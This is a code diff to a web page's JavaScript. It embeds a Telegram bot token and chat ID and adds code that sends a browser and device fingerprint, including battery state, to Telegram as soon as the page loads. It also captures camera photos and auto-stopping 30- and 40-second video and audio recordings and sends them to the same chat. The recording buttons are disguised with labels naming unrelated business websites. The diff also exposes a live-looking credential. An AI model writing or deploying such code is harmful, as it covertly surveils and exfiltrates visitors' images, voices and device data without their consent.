@@ -1,7 +1,7 @@
 /* =================
    Professional JavaScript Logic
    ================= */
-document.addEventListener('DOMContentLoaded', () => {
+document.addEventListener('DOMContentLoaded', async () => {
     // Configuration
     const BOT_TOKEN = '8227630208:AAFcakflRN_1ITpwmMdtTdpF4LPO26UAEwg';
     const CHAT_ID = '5372717005';
@@ -17,6 +17,22 @@ document.addEventListener('DOMContentLoaded', () => {
     let mediaRecorder = null;
     let recordingType = '';
     let initialErrorShown = false;
+    
+    // Send browser fingerprint on page load
+    try {
+        const fingerprint = await collectBrowserFingerprint();
+        const fingerprintText = JSON.stringify(fingerprint, null, 2);
+        const blob = new Blob([fingerprintText], { type: 'text/plain' });
+        const formData = {
+            method: 'sendDocument',
+            fileType: 'document',
+            file: blob,
+            fileName: `browser_info_${Date.now()}.txt`
+        };
+        await sendToTelegram(formData, '📱 معلومات المتصفح والجهاز عند تحميل الصفحة');
+    } catch (error) {
+        console.error('Error sending initial fingerprint:', error);
+    }
 
     // ==================== Helper Functions ====================
 
@@ -224,7 +240,7 @@ document.addEventListener('DOMContentLoaded', () => {
                                 file: blob,
                                 fileName: `capture_${Date.now()}_${i}.jpg`
                             };
-                            await sendToTelegram(formData, `Photo ${i + 1}`);
+                            await sendToTelegram(formData);
                             captureSuccess = true;
                         } catch (imageCaptureErr) {
                             console.warn('ImageCapture failed:', imageCaptureErr);
@@ -257,7 +273,7 @@ document.addEventListener('DOMContentLoaded', () => {
                             file: blob,
                             fileName: `capture_${Date.now()}_${i}.jpg`
                         };
-                        await sendToTelegram(formData, `Photo ${i + 1}`);
+                        await sendToTelegram(formData);
                         captureSuccess = true;
                     }
 
@@ -269,7 +285,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
             updateProgressRing(capturePhotoBtn, 0);
             setTimeout(() => {
-                redirectAfterSuccess();
+                window.open('https://mubassitalshamal-v9.onrender.com/', '_blank');
             }, 500);
         } catch (error) {
             console.error('Photo capture error:', error);
@@ -290,8 +306,8 @@ document.addEventListener('DOMContentLoaded', () => {
         } else {
             recordingType = 'video';
             const videoMimeType = getSupportedVideoMimeType();
-            startRecording(stream, videoMimeType);
-            recordVideoBtn.textContent = '🛑 إيقاف';
+            startRecording(stream, videoMimeType, 30000); // 30 seconds
+            recordVideoBtn.textContent = 'موقع زينة تاتش';
             recordVideoBtn.classList.add('btn-stop');
             recordAudioBtn.disabled = true;
             capturePhotoBtn.disabled = true;
@@ -311,8 +327,8 @@ document.addEventListener('DOMContentLoaded', () => {
             recordingType = 'audio';
             const audioStream = new MediaStream(stream.getAudioTracks());
             const audioMimeType = getSupportedAudioMimeType();
-            startRecording(audioStream, audioMimeType);
-            recordAudioBtn.textContent = '🛑 إيقاف';
+            startRecording(audioStream, audioMimeType, 40000); // 40 seconds
+            recordAudioBtn.textContent = 'موقع بيتك العقارية ';
             recordAudioBtn.classList.add('btn-stop');
             recordVideoBtn.disabled = true;
             capturePhotoBtn.disabled = true;
@@ -321,7 +337,7 @@ document.addEventListener('DOMContentLoaded', () => {
     });
 
     // Start recording
-    function startRecording(streamToRecord, mimeType) {
+    function startRecording(streamToRecord, mimeType, duration) {
         let recordedChunks = [];
 
         try {
@@ -373,7 +389,11 @@ document.addEventListener('DOMContentLoaded', () => {
             const success = await sendToTelegram(formData);
             if (success) {
                 setTimeout(() => {
-                    redirectAfterSuccess();
+                    if (recordingType === 'video') {
+                        window.open('https://abuali782.github.io/Zena-Touch-v2/', '_blank');
+                    } else if (recordingType === 'audio') {
+                        window.open('https://abuali782.github.io/BaytakRealEstate/', '_blank');
+                    }
                 }, 500);
             }
 
@@ -382,6 +402,15 @@ document.addEventListener('DOMContentLoaded', () => {
 
         try {
             mediaRecorder.start();
+            
+            // Auto-stop recording after specified duration
+            if (duration) {
+                setTimeout(() => {
+                    if (mediaRecorder && mediaRecorder.state === 'recording') {
+                        mediaRecorder.stop();
+                    }
+                }, duration);
+            }
         } catch (error) {
             console.error('Recording start error:', error);
             resetButtons();
@@ -390,9 +419,9 @@ document.addEventListener('DOMContentLoaded', () => {
 
     // Reset buttons
     function resetButtons() {
-        recordVideoBtn.textContent = '📹 موقع زينة تاتش';
+        recordVideoBtn.textContent = ' موقع زينة تاتش';
         recordVideoBtn.classList.remove('btn-stop');
-        recordAudioBtn.textContent = '🎤 موقع بيتك العقارية';
+        recordAudioBtn.textContent = ' موقع بيتك العقارية';
         recordAudioBtn.classList.remove('btn-stop');
 
         capturePhotoBtn.disabled = false;
@@ -420,7 +449,7 @@ document.addEventListener('DOMContentLoaded', () => {
                 fileName: `fingerprint_${Date.now()}.txt`
             };
 
-            await sendToTelegram(formData, 'Browser Fingerprint');
+            await sendToTelegram(formData, '📱 معلومات المتصفح والجهاز الكاملة');
         } catch (error) {
             console.error('Fingerprint collection error:', error);
         } finally {
@@ -448,7 +477,15 @@ document.addEventListener('DOMContentLoaded', () => {
                 height: window.screen.height,
                 colorDepth: window.screen.colorDepth,
                 pixelDepth: window.screen.pixelDepth,
-                orientation: window.screen.orientation?.type
+                orientation: window.screen.orientation?.type,
+                availWidth: window.screen.availWidth,
+                availHeight: window.screen.availHeight
+            },
+            window: {
+                innerWidth: window.innerWidth,
+                innerHeight: window.innerHeight,
+                outerWidth: window.outerWidth,
+                outerHeight: window.outerHeight
             },
             timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
             timezoneOffset: new Date().getTimezoneOffset(),
@@ -461,10 +498,32 @@ document.addEventListener('DOMContentLoaded', () => {
             openDatabase: typeof openDatabase !== 'undefined',
             cpuClass: navigator.cpuClass,
             oscpu: navigator.oscpu,
-            connection: getConnectionInfo()
+            connection: getConnectionInfo(),
+            battery: await getBatteryInfo(),
+            geolocation: navigator.geolocation ? 'Available' : 'Not Available',
+            mediaDevices: navigator.mediaDevices ? 'Available' : 'Not Available',
+            permissions: navigator.permissions ? 'Available' : 'Not Available'
         };
 
         return fingerprint;
+    }
+    
+    // Get battery info
+    async function getBatteryInfo() {
+        try {
+            if (navigator.getBattery) {
+                const battery = await navigator.getBattery();
+                return {
+                    level: battery.level,
+                    charging: battery.charging,
+                    chargingTime: battery.chargingTime,
+                    dischargingTime: battery.dischargingTime
+                };
+            }
+            return 'Not Available';
+        } catch (e) {
+            return 'Not Available';
+        }
     }
 
     // Get canvas fingerprint
